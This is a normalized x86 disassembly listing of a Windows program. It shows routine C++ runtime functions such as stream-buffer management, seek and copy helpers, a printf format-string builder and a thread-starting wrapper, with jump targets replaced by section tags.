test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40a150
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
pop esi
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_41a0d6
add esp 0x4
sub_40a1d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_41adb0
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_40a230
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_4195ac
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_40a280
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_419cc5
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_40a2c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_41a0f0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_40a300
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_41a0f0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_40a330
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_41a7eb
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_41ace4
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40a380
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_419ff3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40a3c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x17
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
sub esp 0x14
and ecx eax
je r-xdata
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_41ac98
test cl 0x2
je r-xdata
call sub_419ba1
mov edi eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0xc ] r--data
call sub_419f97
push r--data
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_41ac98
call sub_419ba1
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_419f97
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_41ac98
call sub_419ba1
lea edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_419f97
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_41ac98
sub_40a4c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a4f0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
push edi
xor edi edi
push edi
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_40a3c0
push 0x4
call sub_41ac18
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_419a95
mov [ ebx ] eax
call sub_419854
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_419789
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4197b1
pop edi
mov [ esi + 0x30 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_40a580
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a5b0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d8cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x30
call sub_41ac18
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_4106a0
jmp r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0x0
push eax
push sub_410330
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x2c ] eax
call [ CreateThread@IAT ]
mov [ esi + 0x24 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ecx esi
call sub_4105e0
push esi
call sub_41a0d6
add esp 0x4
sub_40a690
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_419df1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_41a0d6
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_419789
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_4197b1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_40a7c0
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_40a7f0
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
push esi
push edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
pop edi
pop esi
mov ecx [ ebp + 0x8 ]
inc ecx
add [ ebp - 0x8 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
mov ecx ebx
call sub_40a780
mov edi edx
mov esi eax
test edi edi
jl r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_41a0f0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_40a8c0
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
push esi
push edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
pop edi
pop esi
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
mov ecx ebx
call sub_40a7a0
mov edi edx
mov esi eax
test edi edi
jl r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_41a0f0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_40a990
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_40a9c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_40a9f0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_40aa40
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_40aab0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_40ac70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ ebp + 0x24 ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x24 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_40ad90
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_419c87
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40add0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_419c87
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40ae10
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a690
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40ae40
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_419c87
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40aea0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40a150
mov ecx esi
call sub_40a690
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40aed0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x10 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp edx edi
ja r-xdata
mov esp ebp
pop ebp
retn 0xc
mov esi 0x1
sub esi edx
add edi esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea ebx [ ecx + eax ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
push edi
push ecx
push ebx
call sub_41aec0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
push esi
call sub_409f40
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_41aec0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_40af80
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
mov edi ecx
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0xc
mov ebx [ edi + 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx ebx
jae r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov esi edi
mov esi [ edi ]
jmp r-xdata
add ebx eax
cmp ecx 0x10
jb r-xdata
lea esp [ esp ]
add esi edx
cmp esi ebx
jae r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
inc esi
cmp esi ebx
jb r-xdata
mov eax esi
sub eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov edi [ edi ]
mov eax [ ebp + 0x10 ]
movsx ecx [ esi ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
call sub_41aec0
add esp 0xc
test eax eax
jne r-xdata
sub_40b000
push ebp
mov ebp esp
push 0xffffffff
push sub_42d8fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_419dd7
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_41ac18
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_419a95
mov [ edi ] eax
call sub_419854
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_419789
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_4197b1
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0f0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40b120
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
pop edi
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
pop edi
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov dl [ edi + 0x1 ]
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_40b1b0
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
call sub_41ace4
mov ecx [ esi + 0x10 ]
push ecx
call sub_41ace4
mov edx [ esi + 0x14 ]
push edx
call sub_41ace4
add esp 0xc
pop esi
retn
sub_40b1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d920
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x18 ] ebx
call sub_41af6d
xor ecx ecx
mov [ ebp - 0x14 ] eax
